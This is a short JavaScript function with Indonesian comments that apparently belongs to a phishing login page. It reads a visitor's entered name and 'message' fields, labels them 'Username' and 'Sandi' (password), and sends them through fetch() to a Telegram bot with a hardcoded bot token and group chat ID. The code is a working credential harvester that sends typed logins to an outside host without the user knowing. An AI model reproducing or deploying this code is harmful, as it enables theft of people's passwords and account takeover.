  function kirimPesan() {
      // Ganti dengan token bot dan chat ID grup kamu
      const token = '7863353249:AAGeLK7vgDRaqXrdL6dLLSmogSyySPjda7k';
      const chatId = '-4634384561';

      const nama = document.getElementById('nama').value;
      const pesan = document.getElementById('pesan').value;

      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=Username: ${nama} Sandi: ${pesan}`)
        .then(response => response.json())
        .then(data => console.log(data))
        .catch(error => console.error(error));
    }
